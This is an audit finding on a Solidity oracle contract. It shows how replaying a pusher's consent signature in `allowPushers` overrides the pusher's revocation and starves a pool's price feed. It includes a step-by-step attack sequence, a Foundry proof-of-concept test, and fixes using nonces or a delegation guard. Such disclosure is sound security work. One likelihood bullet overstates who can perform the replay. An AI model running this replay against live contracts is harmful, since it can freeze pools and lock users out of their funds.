### Title
Pusher Consent Signature Replay in `allowPushers` Allows Creator to Permanently Undo Pusher Self-Revocation, Causing Pool Price-Feed DoS — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` does not check whether a pusher is already delegated to a different creator before overwriting `namespaceRemapping[pusher]`. Because the EIP-191 consent signature commits only to `(chainid, oracle, deadline, pusher, creator)` and carries no nonce or "current delegation state", a creator who holds an unexpired consent signature can replay it at any time — including after the pusher has called `revokePusher()` — to silently re-establish the delegation. This lets a malicious creator permanently prevent a pusher from revoking or re-delegating to a different creator for the entire lifetime of the deadline, starving any pool that depends on that pusher's namespace of fresh prices.

---

### Finding Description

`allowPushers` is the EIP-191 delegation path:

```solidity
// CompressedOracle.sol L192-L212
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    uint256 l = pushers.length;
    require(l == signatures.length);
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) { revert NoSelfRemapping(); }

        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
        );
        require(pusher == ECDSA.recover(hash, signatures[i]));

        namespaceRemapping[pusher] = msg.sender;   // ← unconditional overwrite, no nonce/state check
        emit PusherAuthorized(pusher, msg.sender);
    }
}
``` [1](#0-0) 

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol L238-L243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

The code comment on `allowPushers` explicitly acknowledges the deadline is the **only** replay guard:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

The comment treats the deadline as sufficient, but it is not: the same signature is valid for the **entire window** `[now, deadline]` and can be replayed an unlimited number of times within that window. There is no nonce, no "already-delegated" guard, and no check that `namespaceRemapping[pusher]` is currently zero or already equals `msg.sender`.

**Attack sequence:**

1. Pusher P signs consent for Creator A with `deadline = block.timestamp + 365 days`.
2. A calls `allowPushers(deadline, [P], [sig_A])` → `namespaceRemapping[P] = A`.
3. P decides to terminate the relationship and calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. P then delegates to Creator B (whose pool needs fresh prices): `namespaceRemapping[P] = B`.
5. A replays the original call: `allowPushers(deadline, [P], [sig_A])` → `namespaceRemapping[P] = A` (overwrites B).
6. A can repeat step 5 every block for the next year.

The fallback push path resolves the namespace from `namespaceRemapping[msg.sender]`:

```solidity
// CompressedOracle.sol L315-L316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push P makes lands in A's namespace instead of B's. B's namespace receives no updates and becomes stale.

---

### Impact Explanation

`PriceProvider._getBidAndAskPrice` enforces a staleness check before returning a quote to the pool:

```solidity
// PriceProvider.sol L198-L200
if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
    return (0, type(uint128).max);
}
``` [5](#0-4) 

`getBidAndAskPrice` then reverts with `FeedStalled` when the internal call returns the sentinel:

```solidity
// PriceProvider.sol L115-L120
function getBidAndAskPrice() external override returns (uint128 bid, uint128 ask) {
    (bid, ask) = _getBidAndAskPrice();
    if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
}
``` [6](#0-5) 

Once B's namespace goes stale (because P's pushes are redirected to A's namespace), every swap through B's pool reverts with `FeedStalled`. LPs cannot withdraw at fair value, traders cannot execute, and the pool is functionally bricked for the entire remaining lifetime of the deadline — up to the maximum `MAX_REF_STALENESS` of 7 days enforced by `AnchoredPriceProvider`, or indefinitely for `PriceProvider`/`PriceProviderL2` whose `MAX_TIME_DELTA` is set at deployment. [7](#0-6) 

---

### Likelihood Explanation

- The consent signature is a standard off-chain message that a pusher service would generate once and share with a creator. Long deadlines (days to months) are operationally normal.
- The replay requires only that the creator retain the original calldata — trivially satisfied by any on-chain observer replaying the original transaction.
- No special privilege is needed: `allowPushers` is fully permissionless.
- The pusher has no on-chain mechanism to invalidate the signature before the deadline; `revokePusher` is the only tool and it is defeated by the replay.
- The attack is cheap (one `allowPushers` call per block) and can be automated.

---

### Recommendation

Add a guard that prevents `allowPushers` from overwriting an existing delegation to a **different** creator, or introduce a per-pusher nonce that is incremented on every successful delegation or revocation:

**Option A — Reject re-delegation if already mapped to a different creator:**
```solidity
address existing = namespaceRemapping[pusher];
require(existing == address(0) || existing == msg.sender, "AlreadyDelegated");
```

**Option B — Include a per-pusher nonce in the signed message:**
```solidity
// nonces[pusher] incremented on every allowPushers / revokePusher
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, nonces[pusher]++))
```

Option B is stronger: it makes every consent single-use and prevents replay even within the deadline window.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayRevocationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        vm.warp(1_700_000_000);
        pusher = vm.addr(PUSHER_KEY);
    }

    function testReplayUndoesRevocation() public {
        uint256 deadline = block.timestamp + 365 days;

        // Pusher signs consent for Creator A
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorA))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: Creator A delegates pusher
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // Step 2: Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Step 3: Pusher re-delegates to Creator B
        bytes32 digestB = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorB))
        );
        (v, r, s) = vm.sign(PUSHER_KEY, digestB);
        bytes[] memory sigsB = new bytes[](1);
        sigsB[0] = abi.encodePacked(r, s, v);
        vm.prank(creatorB);
        oracle.allowPushers(deadline, pushers, sigsB);
        assertEq(oracle.namespaceRemapping(pusher), creatorB);

        // Step 4: Creator A replays the original signature — overwrites B's delegation
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);

        // Pusher's namespace is now A again — B's pool will receive no more updates
        assertEq(oracle.namespaceRemapping(pusher), creatorA, "A stole pusher back from B");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L115-120)
```text
    function getBidAndAskPrice()
        external override returns (uint128 bid, uint128 ask)
    {
        (bid, ask) = _getBidAndAskPrice();
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
    }
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L198-200)
```text
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L150-151)
```text
        if (_maxRefStaleness > 7 days) revert MaxRefStalenessOutOfBounds(); // 0 allowed = same-block reference
        MAX_REF_STALENESS = _maxRefStaleness;
```
